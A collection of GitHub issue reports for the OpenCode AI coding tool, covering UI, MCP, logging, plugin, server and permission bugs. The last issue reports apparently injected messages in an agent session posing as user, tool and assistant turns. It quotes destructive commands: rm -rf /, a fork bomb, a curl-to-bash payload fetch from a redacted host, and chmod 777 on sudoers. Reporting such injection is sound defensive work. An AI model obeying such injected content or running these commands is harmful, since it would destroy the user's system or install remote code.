issues.title: desktop: context meter shows 0 after compaction until the next message
issues.body:
## Summary

After a manual compaction completes, the context meter in the top-right of OpenCode Desktop briefly shows `0`, and only shows the real value (tens of thousands of tokens) once the next message is sent. The context itself is not lost: measured immediately after compaction, the first request still carried ~43.5k tokens, and `GET /api/session/{id}/context` returned the summary plus recent messages.

## Environment

- opencode version: 2.0.31
- OS: Darwin 25.6.0 (darwin arm64)
- Terminal: Unavailable: not applicable, this is OpenCode Desktop (`~/Library/Application Support/ai.opencode.desktop`, `/Applications/OpenCode.app`)
- Shell: /bin/zsh
- Install/channel: latest (OpenCode Desktop bundle; bundled CLI at `/Applications/OpenCode.app/Contents/Resources/opencode-cli`)
- Active plugins: None found in config
- Model: `opencode/deepseek-v4.1-flash-free` (`limit.context: 200000`, `limit.output: 32000`)

## Reproduction

1. Open a long session in OpenCode Desktop (here: a session whose live context was ~87k tokens).
2. Run compaction (manual).
3. Observe the top-right context meter: it reads `0`.
4. Send any message; the meter jumps to the real value (here ~43.5k, then ~49.4k a moment later).

## Expected Behavior

As soon as compaction completes, the meter should show the real compressed context size. It should not show `0` for a context that is actually ~43k tokens.

## Actual Behavior

The meter shows `0` until the next request completes. The value is not a real measurement: right after compaction the next request sent 43,520 tokens (input 40,832 + cache read 2,688).

## Additional Context

Measured on 2026-10-18 from the local session database and `GET /api/session/{id}/context`:

| time | context sent to the model |
| --- | ---: |
| 09:15:07 | compaction completed (`reason: manual`, `status: completed`) |
| 09:15:52 | 43,520 |
| 09:15:55 | 46,633 |
| 09:15:57 | 47,952 |
| 09:15:59 | 49,426 |

- The compaction pass itself read 85,917 input tokens; the generated summary is 4,563 characters.
- After compaction, `GET /api/session/{id}/context` returns 24 messages (the summary plus recent turns). The context is not empty, and the summary is still displayed in the transcript.
- The session row's `time_compacting` is NULL after completion, and there is a `Session.Message.Compaction` message with `status: completed`.
- The behavior is consistent with the meter reading the most recent *request's* usage: immediately after compaction there is no fresh measurement, so it renders as `0` until the next request populates it.

Related: #30930 ("[BUG]: Context percentage display shows jumping values after compact") reports the same family of behavior - the indicator keeps a stale value after compaction and only corrects on the next message. That issue was auto-closed as `NOT_PLANNED` by the stale bot on 2026-08-30, not fixed, and was on V1 / TUI (1.15.x). This report is V2 / Desktop (2.0.31) and is specifically about the value rendering as `0`.

Minor related observations from the same session, in case they share a root cause: the desktop indicator does not appear to expose an absolute token reading (cf. #44716, #49380), and it does not annotate the model's context limit (cf. #42929, #53263).

issues.title: desktop: /models selector omits config-defined providers (only shows credential-store providers)
issues.body:
## Summary

Desktop app's `/models` selector does not show custom providers that are defined only in `opencode.json` (under the V2 `providers` key). They become visible **only after connecting them via `/connect`**, which proves the GUI selector reads the credential store but does **not** render config-defined providers — even though the backend service, config file, and the engine's own model catalog all report them as present and enabled.

## Environment

- opencode version: **2.0.28** (desktop / Electron; bundled CLI `opencode-cli.exe` v2.0.28). Also reproduced on 2.0.26.
- OS: Windows 10, build 19045 (win32 x64)
- Terminal: n/a (desktop GUI)
- Shell: C:\WINDOWS\system32\cmd.exe
- Install/channel: latest (desktop auto-updater)
- Active plugins: None found in config

## Reproduction

1. Define four custom OpenAI-compatible providers **only in `~/.config/opencode/opencode.json`** under the V2 `providers` key. Each uses the official custom-provider recipe: `name`, `package: "@opencode/ai/providers/openai-compatible"`, `settings.baseURL`, `settings.apiKey`, and a `models` map. Provider IDs: `darkforger`, `gcf`, `happycoding`, `arkapi` (1–4 models each, 9 models total). No `disabled_providers` entry contains any of these four names.
2. Start the desktop app (it auto-starts the v2 background CLI service on a localhost port).
3. Open `/models`.

## Expected Behavior

All four config-defined providers and their nine models appear in the `/models` selector, matching what the backend service and config define. Config-driven providers should be selectable without a separate `/connect` step.

## Actual Behavior

Only `darkforger` and `gcf` are shown. `happycoding` and `arkapi` are absent from the GUI selector.

### The decisive evidence: `/connect` makes them appear

Re-connecting `happycoding` and `arkapi` via the in-app `/connect` command (credential store) immediately makes both providers and their models appear in `/models`. `darkforger` was likewise already visible because it had previously been `/connect`-ed; `gcf` is visible because it is the current session's model.

**Inference:** the desktop GUI selector renders providers from the **credential store** (and the active session), but does **not render providers that exist only in the config `providers` map**. Config providers are fully loaded by the backend, yet the selector filters them out.

### Backend confirmation (all correct)

The live service API (Basic auth) and the engine's own model catalog both report all four providers as `activation: "enabled"` and all nine models as `enabled=true, status=active`:

```
GET /api/model     -> 200  (9/9 custom-provider models present, enabled)
GET /api/provider  -> 200  (darkforger/gcf/happycoding/arkapi all "enabled")
engine model catalog (opencode.models):
  gcf(1), arkapi(4), darkforger(2), happycoding(2), opencode(11)
  all 9 custom-provider models -> status: active
```

A real end-to-end API call to each provider also succeeds and returns model output:
```
happycoding/deepseek-v4.1-flash  -> 200, real completion (upstream DeepSeek)
arkapi/glm-5.3                   -> 200, real completion (upstream z-ai/GLM)
```

### Related symptom (2.0.26)

In 2.0.26 the selector additionally requested a non-existent endpoint and mis-routed a model reference through the filesystem-read path:
```
GET /api/integration/model                       -> 404  IntegrationNotFoundError
GET /api/fs/read/happycoding/deepseek-v4.1-flash -> 404
```
In 2.0.28 the selector no longer calls `/api/model` directly; it syncs via the SSE event stream (`/api/event`) and the local model list still omits the config-only providers. A `renderer.log` warning `[server-request-queue] server thrashing detected` was also observed.

### Reproducibility

Consistent across full app restarts, a full PC reboot, and a version upgrade 2.0.26 → 2.0.28. Not a cache/refresh issue — GUI local storage (Local/Session Storage) contains no trace of the four providers, and backend data is current and correct.

## Expected vs. Actual (per provider)

| Provider | In config `providers` | In credential store (`/connect`) | Backend loaded | GUI `/models` shown |
|---|---|---|---|---|
| darkforger | yes | yes (previously connected) | enabled | ✅ shown |
| gcf | yes | (current session model) | enabled | ✅ shown |
| happycoding | yes | **only after `/connect`** | enabled | ❌ config-only → ✅ after `/connect` |
| arkapi | yes | **only after `/connect`** | enabled | ❌ config-only → ✅ after `/connect` |

## Additional Context

- Workaround: use `/connect` for each provider (works), or use the TUI / `opencode-cli run --model <provider>/<model>` (both render/accept config providers correctly).
- Config format follows the official V2 custom-provider recipe (verified against https://opencode.ai/v2/docs/providers).
- All API keys and private/local base URLs have been redacted; the real config contains secrets intentionally not included here.
- Backend service process: `opencode-cli.exe serve --service` (v2.0.28), started by the desktop app. Desktop main.log: `v2 CLI background service ready { url: 'http://127.0.0.1:<port>' }`.
- Root-cause hint for the maintainers: the desktop selector should merge/ render the config `providers` map (the same source the backend loads) instead of relying solely on the credential store.

issues.title: mcp: local server not restarted after transport error
issues.body:
## Summary

When a local (stdio) MCP server process exits unexpectedly while a session is already connected, OpenCode logs a single `mcp transport error` warning and never restarts it. The server's tools silently disappear from the agent's tool list for the remainder of the session. Only an unrelated event — a write to the OpenCode config file, or starting a new session — causes the server to be spawned again.

## Environment

- opencode version: v2.0.22 (channel `latest`)
- OS: Windows_NT 10.0.26200.9550 (win32 x64)
- Terminal: Windows Terminal (`WT_SESSION` set), `TERM=xterm-256color`
- Shell: `C:\WINDOWS\system32\cmd.exe`
- Install/channel: latest (npm `@opencode/cli`)
- Active plugins: none configured in `opencode.json`

## Reproduction

1. Configure a local stdio MCP server that stays alive after `initialize`, for example:
   ```json
   {
     "mcp": {
       "servers": {
         "playwright": {
           "type": "local",
           "command": ["C:\\Program Files\\nodejs\\node.exe", "C:\\path\\to\\mcp\\cli.js"]
         }
       }
     }
   }
   ```
2. Have OpenCode sessions open in two or more directories, so several connections to the same server are spawned (one per directory).
3. Kill the MCP server process from outside OpenCode. A realistic trigger is another OpenCode session running a broad process cleanup such as:
   ```powershell
   Get-Process node,msedge -ErrorAction SilentlyContinue |
     Where-Object { $_.StartTime -gt (Get-Date).AddMinutes(-25) } |
     ForEach-Object { try { $_.Kill() } catch {} }
   ```
   Any `taskkill`, service restart of a parent process, or OOM kill should behave the same way.
4. Observe that the MCP tools are no longer offered to the agent, and that nothing brings them back.

## Expected Behavior

A local MCP server whose process exits unexpectedly should be restarted automatically (ideally with backoff and a cap on retries), so its tools remain available. At minimum, a crash while connected should be retried the same way an initial connect failure is.

## Actual Behavior

One warning is logged per connection and then nothing:

```
timestamp=2026-10-04T20:48:21.035Z level=WARN message="mcp transport error" server=playwright error="MCP server process exited with code 255" role=server directory="<project-a>" connectionID=<id>
timestamp=2026-10-04T20:48:21.051Z level=WARN message="mcp transport error" server=playwright error="MCP server process exited with code 255" role=server directory="<project-b>" connectionID=<id>
timestamp=2026-10-04T20:48:21.067Z level=WARN message="mcp transport error" server=playwright error="MCP server process exited with code 255" role=server directory="<project-c>" connectionID=<id>
timestamp=2026-10-04T20:48:21.082Z level=WARN message="mcp transport error" server=playwright error="MCP server process exited with code 255" role=server directory="<project-d>" connectionID=<id>
timestamp=2026-10-04T20:48:21.099Z level=WARN message="mcp transport error" server=playwright error="MCP server process exited with code 255" role=server directory="<home>" connectionID=<id>
```

No `mcp connected` line follows, and no retry is attempted. The agent's tool list loses every tool from that server and does not recover on its own.

Notes on scope and contrast:

- The shared background service was **not** restarted during this occurrence (same PID and start time before and after), so this is specific to MCP child processes rather than a service restart.
- Retry-on-startup does appear to exist: an earlier `mcp connect failed` was followed by a successful `mcp connected` roughly 35 seconds later. What is missing is retry-on-crash for a server that was already connected.
- Writing to the global config file causes all connections to be torn down and respawned immediately (`mcp connected ... tools=25` for every directory within ~2s), which currently works as an accidental recovery trigger.

## Additional Context

- Frequency: 4 occurrences within roughly 40 minutes in one session. Always reproducible when the child process is killed.
- Exit code was `255` in every occurrence, consistent with an external kill rather than a crash inside the server. The MCP server itself worked correctly when spawned manually: `initialize` succeeded, `tools/list` returned 25 tools, and `tools/call browser_navigate` succeeded.
- An earlier, separate failure mode was also observed and is believed to be a different issue: when the command was `npx -y <package>`, several connections spawned at once raced on the package manager's shared install cache and died with `ENOTEMPTY ... InstallFailed extracting tarball`. Working around it by pre-installing the package and using an absolute path made startup reliable. Mentioned here only for context.
- Workarounds currently used: write to the global `opencode.json` to force a respawn, or `opencode service restart`. Both are indirect — the first mutates configuration as a side effect.
- Suggested direction (if this is a bug rather than intended behavior): treat `mcp transport error` like a failed connect and re-enter the spawn/retry path, ideally with exponential backoff and a cap so a permanently broken server does not spin.

issues.title: server logs for DB query failures drop the underlying SQLite error (EffectDrizzleQueryError.message omits cause)
issues.body:
### Description

During the #54336 investigation, we noticed the server log for the failed session import printed the `EffectDrizzleQueryError` with only the query and params — the actual SQLite error (`UNIQUE constraint failed: session_message.id`) is kept in the error's `cause` field but never appears in any log line. That made the failure look like a payload-shape problem when it was really a constraint conflict.

Root cause: drizzle-orm's `EffectDrizzleQueryError` defines its message as `Failed query: ${query}\nparams: ${params}` — the `cause` field is never rendered:

```js
get message() {
  return `Failed query: ${this.query}\nparams: ${this.params}`
}
```

opencode's failure logging (e.g. `Effect.logError(..., { cause })` in `handlers/rpc.ts` and `handlers/session-error.ts`) relies on that message, so the driver error is invisible exactly when it matters most.

Two possible seams — happy to PR whichever maintainers prefer:
1. upstream drizzle-orm: append the cause to the message getter (one-liner, helps every Effect user)
2. opencode-side: render the cause chain in server error logs — `packages/core/src/util/error-summary.ts` already walks cause chains (used by the credential/oauth paths) and could be applied to the server failure log points

### Reproduce

Import an exported session whose message IDs already exist (repro in #54336). The server log shows `Failed query: insert into session_message ...` + params but never the `UNIQUE constraint failed` line. Direct check of the class:

```js
new EffectDrizzleQueryError({ query: "SELECT 1", params: [], cause: new Error("UNIQUE constraint failed: session_message.id") }).message
// "Failed query: SELECT 1\nparams: []" — no mention of the constraint
```

app: rows on screen are dragged when a settling row is measured (timeline scroll continuity)
issues.body:
### Summary

Wheeling up through a long session drags the rows that are currently on screen: a row that is still carrying the `fallbackItemSize` estimate (`60px`) is measured as it enters the viewport, and the size change is not absorbed by the scroll offset, so everything below it moves.

Measured on `dev` (654b79b), Chromium, no overlay/extension — this is stock app code driven through `packages/app/e2e`.

| action | wheel asked for | `scrollTop` moved | visible rows drifted |
| --- | --- | --- | --- |
| wheel up from the bottom of a long session | 480px | 457px | **+33px** |
| wheel up after leaving follow-the-bottom | 480px | 511px | **−31px** |

The second row is the clearest form: content above the reader shrank by 62px, but only 31px of that was absorbed by the scroll, so the remaining 31px pulled the rows being read upward.

### Reproduction

The contract asserted is: **a row that was on screen must travel exactly as far as the wheel asked for.** The virtualizer is free to move `scrollTop` further than that — that is how it keeps the viewport still while off-screen rows settle — so the test compares against the wheel distance, not against the resulting scroll delta.

Add to `packages/app/e2e/performance/timeline-stability/scroll-interaction.spec.ts`:

```ts
test("keeps visible rows locked to the scroll while wheeling up through history", async ({ page }) => {
  await setupTimeline(page, {
    messages: history(60),
    viewport: { width: 1400, height: 700 },
    reducedMotion: true,
  })

  const scroller = page.locator(".scroll-view__viewport", { has: page.locator("[data-timeline-row]") })
  const wheels = 480

  const sample = () =>
    scroller.evaluate((element) => {
      const view = element.getBoundingClientRect()

      return {
        scrollTop: element.scrollTop,
        view: { top: view.top, bottom: view.bottom },
        rows: Object.fromEntries(
          [...element.querySelectorAll<HTMLElement>("[data-timeline-key]")].map((row) => {
            const rect = row.getBoundingClientRect()

            return [row.dataset.timelineKey!, { top: rect.top, bottom: rect.bottom }]
          }),
        ),
      }
    })

  await scroller.evaluate((element) => (element.scrollTop = element.scrollHeight))
  await expect
    .poll(() => scroller.evaluate((element) => element.scrollHeight - element.clientHeight - element.scrollTop))
    .toBeLessThanOrEqual(1)

  // Leave the follow-the-bottom state first: while the timeline is still pinned to the end
  // the reader's scroll is deliberately overridden, which is not what this test is about.
  await scroller.evaluate((element) => {
    element.dispatchEvent(new WheelEvent("wheel", { bubbles: true, cancelable: true, deltaY: -2000 }))
    element.scrollTop -= 2000
  })
  await expect
    .poll(() => scroller.evaluate((element) => element.scrollHeight - element.clientHeight - element.scrollTop))
    .toBeGreaterThan(1000)
  await page.waitForTimeout(400)

  for (let step = 0; step < 6; step++) {
    const before = await sample()

    await scroller.evaluate((element, delta) => {
      element.dispatchEvent(new WheelEvent("wheel", { bubbles: true, cancelable: true, deltaY: -delta }))
      element.scrollTop -= delta
    }, wheels)
    await page.waitForTimeout(300)

    const after = await sample()
    const scrollDelta = before.scrollTop - after.scrollTop

    expect(scrollDelta).toBeGreaterThan(0)

    const drifted = Object.entries(after.rows)
      .filter(([key]) => {
        const prior = before.rows[key]

        return prior !== undefined && prior.bottom > before.view.top && prior.top < before.view.bottom
      })
      .map(([key, rect]) => ({
        key,
        drift: Math.round((rect.top - before.rows[key]!.top - wheels) * 10) / 10,
      }))
      .filter((row) => Math.abs(row.drift) > 2)

    expect(
      drifted,
      `step ${step + 1} wheels=${wheels} scrollDelta=${scrollDelta} contentDelta=${scrollDelta - wheels} drifted: ${JSON.stringify(drifted)}`,
    ).toEqual([])
  }
})
```

Observed on unmodified `dev`:

```
Error: step 1 wheels=480 scrollDelta=511 contentDelta=31 drifted:
  [{"key":"assistant-part:...:msg_0046_scroll_b_assistant:text:0","drift":128},
   {"key":"turn-gap:msg_0047_scroll_a_user","drift":128}, ...]
```

### Why it happens

`packages/app/src/session/timeline/virtualizer.tsx`

- `estimateSize: () => fallbackItemSize` (line 243) with `fallbackItemSize = 60` (line 32) — a row that has never been measured is accounted at **60**.
- Row geometry comes entirely from that ledger: `top: item().start - topOffset()`, `height: item().size` (~line 791). When a row is measured and its size changes by `delta`, **every row after it moves by `delta`**.
- `shouldAdjustScrollPositionOnItemSizeChange` (lines 364-380) only absorbs the change in two cases:

```ts
const adjust = addedKeys.has(String(item.key))
  ? item.end <= (instance.scrollOffset ?? 0) + instance.scrollAdjustments + instance.options.scrollMargin
  : first !== undefined && item.index < first
```

  `scrollMargin` is `topOffset()` (line 288), and rows are positioned at `item.start - topOffset()`, so the first branch means *"the row's bottom edge is already above the top of the viewport"*. A row that is inside the viewport — or that only straddles its top edge because it is still `60px` tall in the ledger — is not absorbed, and the rows the reader is looking at move with it.

### Attempted fixes and their outcomes

I tried four variants. None of them both fixes the reproduction and keeps the existing suite green, which is why this is an issue rather than a PR.

| # | change | reproduction | existing suite |
| --- | --- | --- | --- |
| 1 | widen only the added-row branch: `item.end <= fold` → `item.end <= fold + scrollRect.height` | still fails | — |
| 2 | widen both branches to `item.end <= fold + scrollRect.height` | **passes** | **breaks** `does not claim keyboard scrolling owned by a nested scrollable` — the timeline's `scrollTop` is moved from 300 to 637 while the reader is not scrolling |
| 3 | only absorb rows that give height back: `delta < 0 && item.end <= fold + scrollRect.height` | still fails (drift +128 comes from a row **growing**) | unchanged |
| 4 | absorb when `item.start <= fold` (covers straddling rows, leaves rows that start inside the viewport anchored to their own top edge) | still fails (`scrollDelta = 393` for a 480px wheel) | unchanged |

Baseline note: on this machine `bunx playwright test --config e2e/performance/timeline-stability/playwright.config.ts` reports **12 failures / 27 passing on unmodified `dev`** (Windows, headless Chromium), so the suite is not a clean signal here — CI may differ.

### The design question this runs into

Absorbing a size change is unambiguously right when the resized row is above the viewport: the reader's content stays put.

When the row itself is partly on screen and **grows**, absorbing the change keeps the content below fixed but slides that row's own content upward under the reader. Not absorbing it keeps the row's top edge fixed and pushes everything below down. Neither edge can be held. Variant 2 hit exactly this: it fixed the wheel-up drift and, in exchange, moved `scrollTop` while the reader was idle.

So the question worth deciding first is which edge should be authoritative for a row that resizes while it is (partly) visible, and whether that answer should depend on whether the resize is user-initiated (expanding a tool card) or machine-initiated (a deferred row settling from its estimate).

### Environment

opencode `dev` @ `654b79b`, `bun 1.4.2`, Windows 11, headless Chromium 1217 via Playwright 1.59.1. Found while building a local web shell around the official UI; the reproduction above is stock app code and does not depend on that shell.

Happy to turn any of the four variants into a PR once the edge choice above is settled.

issues.title: Server-channel plugins that resolve their own @opentui/core are dropped with a WARN (env-registry singleton conflict, OPENTUI_FORCE_UNICODE)
issues.body:
### Same mechanism as #42338, but a different variable and channel

This is the same `@opentui/core` env-registry singleton conflict as #42338, but a distinct instance — different variable, different channel, different symptom. Filing it separately because the server-side face is easy to miss if it is folded into that one.

| | #42338 | this issue |
|---|---|---|
| variable | `OPENTUI_FORCE_WCWIDTH` | `OPENTUI_FORCE_UNICODE` |
| channel | TUI plugin | **server** plugin (`plugins` in `opencode.json`) |
| version | `0.0.0-next-17403` | **2.0.28** |
| symptom | TUI crash (orphan text) | plugin is dropped with a **WARN** and silently disappears |

First hit in practice with a published plugin on 2.0.28: `opencode-cache-hit@0.7.6` (it declares `@opentui/core` / `@opentui/solid` as peers). The reproduction below does not depend on it.

### Minimal reproduction (opencode 2.0.28, fully isolated XDG, no other plugins)

```bash
set -e
ROOT=$(mktemp -d); cd "$ROOT"
export XDG_CONFIG_HOME="$ROOT/config" XDG_DATA_HOME="$ROOT/data" \
       XDG_STATE_HOME="$ROOT/state" XDG_CACHE_HOME="$ROOT/cache"
mkdir -p "$XDG_CONFIG_HOME/opencode" "$XDG_DATA_HOME" "$XDG_STATE_HOME" "$XDG_CACHE_HOME"
opencode service set port 49812          # isolated port; don't touch an already-running instance

# a minimal V2 server plugin whose own dependency tree contains @opentui/core
mkdir -p "$ROOT/plugin" && cd "$ROOT/plugin"
cat > package.json <<'EOF'
{ "name": "env-registry-repro", "version": "1.0.0", "type": "module",
  "exports": { ".": "./index.js" },
  "peerDependencies": { "@opentui/core": ">=0.2.0" } }
EOF
cat > index.js <<'EOF'
import "@opentui/core";
export default { id: "env-registry-repro", setup() { return () => {}; } };
EOF
npm install --no-audit --no-fund         # resolves @opentui/core 0.6.5 today

cat > "$XDG_CONFIG_HOME/opencode/opencode.json" <<EOF
{ "\$schema": "https://opencode.ai/config.json", "plugins": ["file:$ROOT/plugin"] }
EOF

cd "$ROOT" && opencode plugin list --print-logs
sleep 3   # the plugin is loaded by the service process; give it a moment to flush the log
grep -E "loading plugin|failed to load plugin" "$XDG_DATA_HOME/opencode/log/opencode.log"
```

### Observed

Copied verbatim from `$XDG_DATA_HOME/opencode/log/opencode.log` (run ids elided as `…`; the second
line is a single log line):

```
level=INFO run=… msg="loading plugin" id=file:…/plugin entrypoint=file://…/plugin/index.js role=server

level=WARN run=… message="failed to load plugin" target=file:…/plugin ref=err_bf2938dc
cause="Cause([Die(Error: Environment variable \"OPENTUI_FORCE_UNICODE\" is already registered with different configuration. Existing: {\"name\":\"OPENTUI_FORCE_UNICODE\",\"description\":\"Force Mode 2026 Unicode support when the variable is present\",\"type\":\"string\",\"required\":false}, New: {\"name\":\"OPENTUI_FORCE_UNICODE\",\"description\":\"Use the Unicode width method (mode 2027) when the variable is present\",\"type\":\"string\",\"required\":false})])" http.span=125 role=server
```

`Existing` is the host's registration, `New` is the plugin's own `@opentui/core` copy. The plugin
never runs; `opencode plugin list` reports `No plugins found`.

### Why

Both copies use the same global registry key — `globalThis[Symbol.for("@opentui/core/singleton")]`,
bag `"env-registry"` — and `registerEnvVar` throws when `description`/`type`/`default`/`required`
differ. In 2.0.28 the host registers

```
OPENTUI_FORCE_UNICODE  string  required=false  "Force Mode 2026 Unicode support when the variable is present"
```

while `@opentui/core` 0.6.x registers the same name as

```
OPENTUI_FORCE_UNICODE  string  required=false  "Use the Unicode width method (mode 2027) when the variable is present"
```

The server plugin loader is a bare `import()` of the resolved entrypoint
(`Host.load = (o) => import(o)`), so nothing redirects the plugin's `@opentui/core` to the host's
bundled copy: the plugin loads a second copy from its own `node_modules` and the second registration
throws. `@opentui/solid` is affected the same way, since 0.6.x lists `@opentui/core` in its
`dependencies`.

### Which plugins are affected (measured against the 2.0.28 binary)

Comparing the host binary's env-var registry with each `@opentui/core` release, field by field:

| `@opentui/core` resolved by the plugin | result |
|---|---|
| 0.2.0 – 0.4.5 | conflict (16 field diffs; first hit is `OPENTUI_FORCE_WCWIDTH`, whose `type` is `boolean` there vs `string` in the host) |
| **0.5.0 – 0.5.17** | no conflict (registry identical to the host's) |
| 0.6.0 – 0.6.5 | conflict (`OPENTUI_FORCE_UNICODE` description) |

So the practical rule is: a server plugin breaks if it imports `@opentui/*` at module scope **and**
its own dependency tree resolves `@opentui/core` to anything outside 0.5.x. A `>=0.2.0` peer range
resolves to the current latest (0.6.5) and therefore fails by default. Declaring it as `dependencies`
instead of `peerDependencies` makes no difference; both put a second copy in the plugin's
`node_modules`. A plugin that does not import `@opentui/*` at all loads normally.

### Server channel vs TUI channel

The TUI channel does not have this problem in 2.0.28 because the TUI bundle installs an OpenTUI
runtime-module rewrite once at its top level (`ensureRuntimePluginSupport`), which rewrites
`@opentui/core` / `@opentui/core/testing` specifiers to host runtime modules. The server channel's
loader has no equivalent step — which is exactly why the `New:` description in the log above is the
plugin's copy rather than the host's.

Two caveats, so this is not over-read:

- I verified the rewrite exists and that its installation site is in the TUI bundle by reading the
  2.0.28 binary; I did **not** get a TUI-channel plugin to load in my own fixture, so the
  "TUI unaffected" half is code-level evidence here, not an end-to-end run.
- The rewrite module carries an options object `{ nodeModulesRuntimeSpecifiers: true, nodeModulesBareSpecifiers: false }`.
  If `nodeModulesBareSpecifiers: false` means bare specifiers inside `node_modules/` are left alone,
  then npm-installed TUI plugins could still hit this, and only local-directory TUI plugins would be
  safe. I could not confirm or rule that out, so it may be worth checking before concluding that the
  TUI channel is universally fine.

### Notes

- Failure level is `WARN`; opencode itself keeps running. The only visible effect is that the plugin
  is absent, which makes this hard to diagnose from the user side.
- I did not test lazy `await import("@opentui/core")` inside a function body; the failure point would
  presumably move to that call.
- `0.1.x` releases were not included in the version comparison.

Happy to provide the full scripts / raw logs if that would help.

issues.title: serve: requests sent right after the port opens are never answered
issues.body:
### Description

`opencode serve` accepts TCP connections a few hundred milliseconds before it can handle them. A request sent on a connection accepted in that window never gets a response: the socket stays open and the client waits until its own timeout. Requests on connections opened a little later are answered in milliseconds.

This hits any client that starts `opencode serve` and polls the port until it accepts. We embed `opencode serve` in an Android app and saw the first request hang for the full 120 s HTTP timeout on most cold starts.

Seen on 1.18.5 and 1.19.3, and on the current `v1` branch (a1f604bbe). The `dev` branch (2.x) is not affected: requests that arrive before the routes are ready get a 503 there.

### Cause

In `packages/opencode/src/server/server.ts`, `NodeHttpServer.layer` calls `server.listen()` first. `HttpRouter.serve` only adds the `"request"` listener after `HttpApiApp.createRoutes` has been built, which takes a few hundred ms. Node's `http.Server` parses a request that arrives in between and emits `"request"` with no listener attached. That request is dropped and never answered.

Minimal reproduction with plain `node:http`, which behaves the same under Node 22 and Bun 1.4:

```js
import { createServer } from "node:http"
import net from "node:net"
const server = createServer()
server.listen(0, "127.0.0.1", () => {
  const sock = net.connect(server.address().port, "127.0.0.1", () =>
    sock.write("GET / HTTP/1.1\r\nHost: a\r\n\r\n"))
  sock.on("data", () => console.log("answered"))
  setTimeout(() => server.on("request", (req, res) => res.end("ok")), 400)
  setTimeout(() => { console.log("done"); process.exit() }, 3000) // never prints "answered"
})
```

### Steps to reproduce

1. Run `OPENCODE_SERVER_PASSWORD=pw opencode serve --hostname 127.0.0.1 --port 4096`.
2. As soon as the port accepts a connection, send `GET /api/info` (or `/global/health`) with basic auth on that connection.
3. The request is never answered, even after 2 minutes. A request on a new connection about 0.5 s later returns 200 immediately.

Measured with an empty config and no plugins: 12/12 first requests hung; requests sent 0.5 s or more after the port opened were answered.

### Plugins

None (reproduces with an empty config)

### OpenCode version

1.19.3 (also 1.18.5)

### Operating System

Linux (x86_64, glibc and musl builds), Android (arm64 musl build under proot)

### Terminal

N/A (headless `opencode serve`)

issues.title: core: permission "ask" silently auto-approved — no request created (deny still enforced)
issues.body:
### Description

Rules resolving to "ask" are silently auto-approved by the shared background service. The tool call just runs: no permission request is created, the session permission queue stays empty, and no permission.* events appear in the server log (other bus event types are logged normally). deny rules in the same permissions array ARE enforced before execution — so the rules are evaluated; only the ask branch proceeds without asking. Net effect equals --auto mode even though --auto is set nowhere.

Not client-specific: the TUI (no --auto in argv, no auto indicator visible) and fresh opencode run sessions both execute silently. Third-party integrator reports (open-design#7624) describe opencode run stopping at permission prompts — ours never prompts. Not shell-specific either: the base external_directory ask is bypassed too (agent read /etc/hosts with no prompt).

Ruled out locally: saved approvals empty; session permission DB column NULL; no OPENCODE_* env vars on TUI or service processes; no launchd-registered flags; plugins (opencode-mem, superpowers) inspected — neither registers a permission.evaluate handler; forcing OPENCODE_CLI_CONFIG_CONTENT with session.permissions=prompt changed nothing; identical behavior with the old V1 permission.bash syntax; full service restart re-reads config (GET /api/config shows the array intact with effect ask) and changes nothing. Reproducible 100%.

Expected: per docs, ask means "wait for a decision from the client". Actual: behaves as if auto-approval were always on. Security-relevant: ask guardrails for rm/cp/mv/sed and .env/external-directory access do nothing in the default mode.

### Plugins

_No response_

### OpenCode version

2.0.29 (channel: latest)

### Steps to reproduce

1. Global config ~/.config/opencode/opencode.json (plus any working provider/model):
{
  "$schema": "https://opencode.ai/config.json",
  "permissions": [
    { "action": "read",  "resource": "*",             "effect": "allow" },
    { "action": "shell", "resource": "*",             "effect": "allow" },
    { "action": "shell", "resource": "mv *",          "effect": "ask" },
    { "action": "shell", "resource": "cp *",          "effect": "ask" },
    { "action": "shell", "resource": "rm *",          "effect": "ask" },
    { "action": "shell", "resource": "rm -rf *",      "effect": "deny" },
    { "action": "shell", "resource": "sudo rm -rf *", "effect": "deny" }
  ]
}

2. Confirm parse: opencode api get "/api/config?location%5Bdirectory%5D=$PWD" -> the global document shows the array above, effect "ask" intact.
3. 3. Fresh TUI session, agent runs: cp a b -> executes immediately, no dialog. GET /api/session/<id>/permission -> {"data":[]}.
4. 4. Control (proves rules are evaluated): agent runs mkdir d && rm -rf d -> blocked before execution, tool result {"error":{"type":"permission.rejected","message":"Permission denied: shell"}} — the mkdir never ran either.
5. 5. Control (client-independent): fresh shell, opencode run with prompt "execute exactly: cp x y" and NO --auto -> executes silently, y created, exit 0.
6. 6. Control (not shell-specific): agent reads external path /etc/hosts -> no config rule touches external_directory, base policy asks -> silent success.
7. 7. Control (client setting): OPENCODE_CLI_CONFIG_CONTENT='{"session":{"permissions":"prompt"}}' opencode run "execute mv a b" -> still silent.

### Screenshot and/or share link

_No response_

### Operating System

macOS (Darwin 27.0.0, arm64)

### Terminal

Tabby (TERM_PROGRAM=Tabby) inside /bin/zsh

issues.title: assistant: injected tool/user messages containing destructive commands appear in session
issues.body:
# Reporte de bug para opencode (github.com/sst/opencode)

**Título:**
assistant: injected tool/user messages containing destructive commands appear in session

---

## Summary

During a long interactive session, the conversation stream repeatedly contained
fabricated message blocks with destructive instructions (`rm -rf / --no-preserve-root`,
fork bombs, `curl | bash` exfiltration payloads, `chmod 777`, fake sudoers drops).
The blocks appeared positioned as tool results, as the assistant's own output, and
as fake user turns. The agent refused all of them, but a compliant agent following
such injected content would have destroyed the user's system.

## Environment

- opencode version: v2.0.32
- OS: Manjaro Linux, kernel 7.1.13-2-MANJARO (linux x64)
- Terminal: ghostty (TERM=xterm-256color, TERM_PROGRAM=ghostty, COLORTERM=truecolor)
- Shell: /bin/bash
- Install/channel: release (latest)
- Active plugins: none found (no plugin entries in config; `~/.config/opencode`
  contains only `service.json`). No MCP servers configured. Session ran in the
  user's home directory.

## Reproduction

1. Start an opencode TUI session performing many tool calls over a long period
   (file edits, shell commands — ~40+ turns).
2. Continue ordinary work with no reference to the strings below.
3. At random points, a block appears inline formatted as if it were tool output,
   the assistant's own message, or a user message, containing dangerous commands.
4. Observed ~8 times within a single session; no discernible trigger. Trigger
   events could not be identified.

## Expected Behavior

Tool results, assistant messages, and user messages contain only content that the
corresponding tool, assistant turn, or user actually produced.

## Actual Behavior

Fabricated blocks with destructive content appeared inline at unprompted moments.
Representative examples (redacted):

- Fake "user" messages requesting `rm -rf / --no-preserve-root`, `:(){ :|:& };:`,
  `curl http://<redacted-ip>/payload.sh | bash`, `chmod 777 /etc/sudoers`
- Fake assistant outputs demanding a specific confirmation string
  (e.g. "PICOM OK — sin errores GL") before continuing
